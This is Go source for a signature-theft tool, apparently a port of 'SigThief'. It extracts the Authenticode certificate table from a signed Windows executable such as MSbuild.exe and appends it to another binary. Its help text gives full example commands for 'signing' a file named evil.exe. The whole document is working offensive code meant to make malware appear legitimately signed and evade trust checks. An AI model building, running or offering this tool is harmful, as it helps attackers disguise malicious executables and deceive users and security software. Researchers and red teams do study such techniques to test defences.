package main

import (
	"flag"
	"github.com/Binject/debug/pe"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

type FlagOptions struct {
	certfile     string
	inputfile    string
	outputfile   string
	savecert     bool
	signfromdisk bool
	signfromexe  bool
	showexample  bool
}

func options() *FlagOptions {
	inputfile := flag.String("i", "", "inputfile")
	outputfile := flag.String("o", "", "outputfile")
	certfile := flag.String("c", "", "certfile")
	savecert := flag.Bool("s", false, "save cert to disk")
	addcert := flag.Bool("a", false, "add signature to file")
	help := flag.Bool("show", false, "show example")
	flag.Parse()
	if *help {
		println("Save cert: sigthief.exe -i MSbuild.exe -s -o MSbuild.cert")
		println("Add cert from certfile: sigthief.exe -a -i evil.exe -o evil-sign.exe -c MSbuild.cert")
		println("You can also use exe to add cert: sigthief.exe -a -i evil.exe -o evil-sign.exe -c MSbuild.exe")
	}
	signfromdisk := false
	signfromexe := false
	if *savecert == true {
		return &FlagOptions{
			certfile:     *certfile,
			inputfile:    *inputfile,
			outputfile:   *outputfile,
			savecert:     *savecert,
			signfromdisk: signfromdisk,
			signfromexe:  signfromexe,
			showexample:  *help,
		}
	} else if *addcert == true {
		if strings.Contains(*certfile, ".exe") {
			signfromdisk = false
			signfromexe = true
		} else {
			signfromdisk = true
			signfromexe = false
		}
	}

	return &FlagOptions{
		certfile:     *certfile,
		inputfile:    *inputfile,
		outputfile:   *outputfile,
		savecert:     *savecert,
		signfromdisk: signfromdisk,
		signfromexe:  signfromexe,
		showexample:  *help,
	}
}

func main() {
	opt := options()
	if opt.savecert == true && (opt.signfromdisk || opt.signfromexe) {
		print(opt.savecert, opt.signfromexe, opt.signfromdisk)
		log.Fatal("You can't both save certfile and sign")
	} else if opt.savecert {
		savecert(opt.inputfile, opt.outputfile)
	} else if opt.signfromdisk {
		writecertfromdisk(opt.outputfile, opt.inputfile, opt.certfile)
	} else if opt.signfromexe {
		writecertfromexe(opt.outputfile, opt.inputfile, opt.certfile)
	} else if !opt.showexample {
		println("You don't choose any choice, -h to check the help")
	}
}

func savecert(sigexe string, dstcert string) {
	cert := getcert(sigexe)
	ioutil.WriteFile(dstcert, cert, os.ModePerm)
}

func getcert(sigexe string) []byte {
	pefile, _ := pe.Open(sigexe)
	defer pefile.Close()
	if string(pefile.CertificateTable) == "" {
		log.Fatal("ERROR!Certfile Not signed! ")
	}
	return pefile.CertificateTable
}

func writecertfromdisk(outputloc string, inputloc string, cert string) {
	certfile, _ := ioutil.ReadFile(cert)
	appendcert(outputloc, inputloc, certfile)
}

func writecertfromexe(outputloc string, inputloc string, certfileloc string) {
	certfile := getcert(certfileloc)
	appendcert(outputloc, inputloc, certfile)
}

func appendcert(outputloc string, inputloc string, cert []byte) {
	pefile, _ := pe.Open(inputloc)
	pefile.CertificateTable = cert
	pefile.WriteFile(outputloc)
}
